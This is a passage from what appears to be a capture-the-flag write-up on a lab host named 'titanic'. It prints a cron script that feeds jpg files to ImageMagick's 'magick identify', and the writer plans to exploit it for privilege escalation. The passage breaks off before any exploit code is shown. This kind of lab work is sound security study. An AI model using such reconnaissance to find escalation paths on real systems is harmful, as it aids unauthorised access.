There is interesting directory 'scripts' and there are two directory user developer have privilege. At first, let's observe what's in the scripts dir.

|_$ cd scripts
|_$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify
>> metadata.log

This file empty contents of metadata.log, and find all jpg files in this folder and then passing those to the magick command. The output is returned to metadata.log again.

As you can see, the file metadata.log is updated every minutes. Therefore, we can say the file identify_images.sh is cronjob. Let's check if we can exploit this file.

developer@titanic:/opt/scripts$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
